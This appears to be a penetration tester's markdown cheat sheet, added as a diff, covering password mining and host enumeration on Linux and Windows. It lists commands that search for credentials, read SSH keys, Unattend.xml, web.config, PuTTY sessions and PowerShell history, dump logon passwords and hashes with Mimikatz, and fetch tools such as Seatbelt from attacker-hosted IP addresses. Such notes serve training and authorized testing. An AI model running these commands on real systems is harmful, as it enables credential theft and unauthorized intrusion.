@@ -1,0 +1,112 @@
+### Password Mining -
+#### Linux
+- Reference - [Linux Password Mining]([https://medium.com/@tinopreter/linux-password-mining-58e341635f1c](https://medium.com/@tinopreter/linux-password-mining-58e341635f1c))
+- `ls /home/<user>/.ssh/`
+	- By default, SSH searches for `id_rsa, id_ecdsa, id_ecdsa_sk, id_ed25519, id_ed25519_sk, and id_dsa` files. - [Reference](https://askubuntu.com/questions/30788/does-ssh-key-need-to-be-named-id-rsa)
+- Search password in other files
+	- `grep -r pass /home 2>/dev/null`
+	- `grep -r pass /opt 2>/dev/null`
+	- `grep -r pass /tmp 2>/dev/null`
+	- `grep -r pass /etc 2>/dev/null`
+	- `grep -r pass /var 2>/dev/null`
+	    - Alternative command - `find /opt -type f -exec grep -i -I "pass" {} /dev/null;`
+    - Sticky bit files - `find / -perm 1777 -type f 2>/dev/null`
+- Extract password from memory
+#### Windows
+- Reference - [Windows Password Mining]([https://medium.com/@tinopreter/windows-password-mining-3a72205673ff](https://medium.com/@tinopreter/windows-password-mining-3a72205673ff))
+- Search for file containing pass string
+	- `findstr /si /m "pass" *.xml *.ini *.conf *.txt *.log *.bak`
+- Search for files
+	- `Get-ChildItem -Path <Path> -Include *.log,*.txt,*.bak,*.kdbx -File -Recurse -ErrorAction SilentlyContinue`
+	- Alternative - `dir /s *.log,*.txt,*.bak,*.kdbx`
+- Display lines containing “pass” string - `type "<file-name>" | Select-String -Pattern "pass"`
+- Check for any Writable File
+	- Alternative mass checking
+	    - Files with `Everyone:(I)(F)` permission - `icacls "Path\To\Directory\*" 2>nul | findstr "(F)" | findstr "Everyone"`
+        - Files with `BUILTIN\Users:(F)` permission (for all members of Users Group) - `icacls "Path\To\Directory\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"`
+        - Files with `Everyone:(I)(M)` permission - `icacls "Path\To\Directory\*" 2>nul | findstr "(M)" | findstr "Everyone"`
+        - Files with `BUILTIN\Users:(M)` permission (for all members of Users Group) - `icacls "Path\To\Directory\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"`
+    - Can use accesschk64.exe to check writable folders and files
+	    - `accesschk64.exe -qwsu "Everyone" *`
+        - `accesschk64.exe -qwsu "Authenticated Users" *`
+        - `accesschk64.exe -qwsu "Users" *`
+- Unattended Windows Installer - Single OS image mass installation on large machines. Such installation requires Administrator access, so might store credentials in following locations -
+	- `C:\Unattend.xml`
+    - `C:\Windows\Panther\Unattend.xml`
+    - `C:\Windows\Panther\Unattend\Unattend.xml`
+    - `C:\Windows\system32\sysprep.inf`
+    - `C:\Windows\system32\sysprep\sysprep.xml`
+- IIS Web Server - The configuration file i.e. web.config might store passwords for database or configured authentication mechanisms. They can be found -
+	- `C:\inetpub\wwwroot\web.config`
+    - `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`
+    - Can perform this - `type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`
+- Credentials stored in software PuTTY
+	- `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`
+- Powershell History
+	- `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
+- Software - Check if any password manager is in installed or uninstalled application list
+	- `Get-ItemProperty  "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
+    - `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
+- Windows registry - Windows Registry is a database that contains configs and settings for windows and other applications installed on the system. Following commands display specific string occurances in registry -
+	- `reg query HKLM /f password /t REG_SZ /s`
+    - `reg query HKCU /f password /t REG_SZ /s`
+- mimikatz.exe - [Mimikatz Hacktricks](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz)
+	- `mimikatz> privilege::debug` - engage the SeDebugPrivilege privilege, which will allow us to interact with a process owned by another account
+    - `mimikatz> token::elevate` - elevate your permissions
+    - `mimikatz> sekurlsa::logonpasswords` - dump the credentials of all logged-on users
+    - `mimikatz> lsadump::sam` - dump the SAM file hashes
+    - `mimikatz> sekurlsa::tickets` - dump kerberos tickets from memory
+- Get list of kerberos tickets for logged in user - `klist`
+### Discovery -
+#### Linux
+- `id` → User Information
+- `cat /etc/issue` → OS Information
+- `uname -a` → Kernel Information
+- `ls /home` → List user directory
+- `ls -al /home/*` → all users basic contents
+- `cat /etc/passwd` → System user information
+- `cat /etc/hosts` → Host file
+- `ss -ntplu` → Open ports
+- `ps -ef` → Active processes
+- `ip route` or `ifconfig /all` → IP Configuration
+- `history` → Command history
+- `printenv` → Environment Variables
+- `cat /etc/iptables/rules.v4` → firewall rules
+- `pspy64` - Continuous enumeration of processes - [pspy64](https://github.com/DominicBreuker/pspy)
+- `linpeas.sh` - Automated Linux Enumeration - [linpeas](https://www.kali.org/tools/peass-ng/)
+#### Windows
+- `whoami /all` → Active user information
+- `net user`  → List of users
+	- `PS> Get-LocalUser | ft Name,Enabled,LastLogon` → Alternative with some extra information
+- `dir C:\Users`  → List of user directory
+- `PS> Get-LocalGroup` → Gives list of groups in system (Name, Description)
+- `PS> Get-LocalGroupMember <group-name>` → Gives list of members in specified `<group-name>` (ObjectClass, Name, PrincipalSource)
+- `systeminfo`  → System Information
+- `ipconfig` or `ip route`  → IP configuration
+- `route print`  → Routing table
+- `netstat -ano`  → Open Ports
+- `Get-Process` or `tasklist /svc`  → Enumerate process
+- `Get-History`  → Enumerate history
+- `Get-LocalGroupMembers <group-name>`
+- `(Get-PSReadlineOption).HistorySavePath` → Powershell History File Path
+- Watch-Command - stay
+	- [Tutorial](https://wragg.io/watch-for-changes-with-powershell/), [Source](https://github.com/markwragg/PowerShell-Watch)
+    - Download Watch-Command script from here - [Watch-Command.ps1](https://www.powershellgallery.com/packages/Watch/1.0.7/Content/Public%5CWatch-Command.ps1)
+    - `PS> iwr -uri http://192.168.45.157/172/172-12/Watch-Command.ps1` -Outfile Watch-Command.ps1
+    - `PS> Import-Module .\Watch-Command.ps1` → Import powershell script
+    - `PS> Get-Process | Watch-Command -Diff -Cont -Verbose` → Perform watch on enumerating process
+    - `PS> Get-Process -ErrorAction SilentlyContinue | Watch-Command -Diff -Cont -Verbose -Seconds 30` → Perform watch every 30 seconds on enumerating process
+    - `PS> Get-Process backup -ErrorAction SilentlyContinue | Watch-Command -Diff -Cont -Verbose` → Perform watch on enumerating process and filter with backup processes
+- winPEAS - Automated Windows Enumeration - [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
+- Seatbelt - [Seatbelt Package]([https://github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt))
+	- Seatbelt.exe → kinda similar to winPEAS, but more advanced (specifically for AD)
+    - Reference - [Video](https://www.youtube.com/watch?v=8KJebvmd1Fk&t=1185s)
+    - Build
+	    - Go to Windows and clone seatbelt from - [https://github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)
+        - Open Seatbelt.sln with Visual Studio
+        - Change Debug dropdown in menu to Release
+        - Select Build Solution from Build menu to get Seatbelt.exe
+    - On executing Seatbelt.exe , we get error that executable is not a valid application for OS platform
+	    - Solution - We should try uploading executable with different method, some of them are
+	        - iwr, certutil, smbshare, curl (as per video this worked) (curl 10.10.10.169/seatbelt.exe -o seatbelt.exe), Net-Object Net.WebClient ...
+	        - OR while building release of seatbelt → Right click seatbelt → select ‘Properties’ → Select .NET Framework 4 or 4.5  for Target framework
